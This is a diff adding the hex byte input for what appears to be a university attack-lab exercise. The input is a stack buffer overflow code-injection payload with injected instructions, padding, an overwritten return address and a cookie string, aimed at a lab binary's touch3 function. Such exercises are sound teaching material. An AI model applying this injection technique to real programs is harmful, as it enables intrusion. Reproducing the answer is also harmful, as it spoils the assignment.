@@ -1,0 +1,13 @@
+48 c7 c7 b0 9d 61 55 /* %rsp(8) + 0x38 + touch3(8) */
+68 c3 16 40 00 /* return address for touch3 */
+c3 /* return */
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* buffer 0x38 - 13 bytes from the above line */
+68 9d 61 55 /* rsp address found from getsbuf of our input string,code injection attack */
+            /* Passing a string as argument */
+00 00 00 00 00 00 00 00 00 00 00 00 /* need to push our cookie further back to the right position */
+31 61 37 64 64 38 30 33 /* cookie convert to text without the leading 0x in front */
